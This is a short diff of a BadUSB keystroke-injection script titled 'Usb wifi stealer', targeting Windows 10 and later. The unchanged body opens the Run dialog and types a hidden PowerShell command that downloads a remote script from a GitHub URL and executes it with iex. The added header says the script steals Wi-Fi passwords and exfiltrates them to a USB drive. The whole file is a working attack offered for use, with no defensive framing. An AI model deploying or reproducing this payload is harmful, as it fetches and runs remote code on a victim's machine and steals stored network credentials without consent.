@@ -1,6 +1,6 @@
-REM Title: 
-REM Description: 
-REM Target OS:
+REM Title: Usb wifi stealer
+REM Description: Run the wifi password stealer script and bring a usb to exfiltrate it 
+REM Target OS: Windows 10+
 GUI r 
 DELAY 500
 STRINGLN powershell -w h iwr https://raw.githubusercontent.com/SuperJakov/Badusb/main/wifi-stealer/USB/usb-wifi-stealer.ps1 | iex
